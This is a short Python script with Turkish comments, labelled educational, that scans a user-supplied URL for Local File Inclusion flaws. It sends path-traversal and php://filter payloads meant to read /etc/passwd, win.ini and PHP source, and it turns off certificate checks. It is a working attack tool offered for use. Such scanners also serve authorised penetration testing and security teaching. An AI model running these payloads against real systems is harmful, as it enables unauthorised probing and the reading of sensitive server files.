#!/usr/bin/env python3
"""
LFI Scanner (Eğitim Amaçlı)
============================
Local File Inclusion zafiyetlerini tespit eder.
requests kütüphanesi gerektirir (pip install requests)
"""
import sys
try:
    import requests
    requests.packages.urllib3.disable_warnings()
except ImportError:
    print("[-] Lütfen 'requests' kütüphanesini yükleyin: pip install requests")
    sys.exit(1)

LFI_PAYLOADS = [
    "../../../../../../etc/passwd",
    "..\\..\\..\\..\\..\\..\\windows\\win.ini",
    "....//....//....//....//etc/passwd",
    "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
    "/etc/passwd",
    "C:\\windows\\win.ini",
    "php://filter/convert.base64-encode/resource=index.php",
]

SIGNATURES = ["root:x:0:0", "[extensions]", "for 16-bit app support"]

def scan_lfi(url):
    print(f"[*] Hedef: {url}")
    print("-" * 60)
    vulns = []
    for payload in LFI_PAYLOADS:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=5, verify=False)
            for sig in SIGNATURES:
                if sig in r.text:
                    vulns.append(payload)
                    print(f"  [!] ZAFIYET: {payload}")
                    break
        except:
            pass
    print("-" * 60)
    print(f"[+] {len(vulns)} LFI zafiyeti tespit edildi." if vulns else "[-] LFI bulunamadı.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Kullanım: python LFI_Scanner.py \"http://target.com/page.php?file=\"")
        sys.exit(1)
    scan_lfi(sys.argv[1])
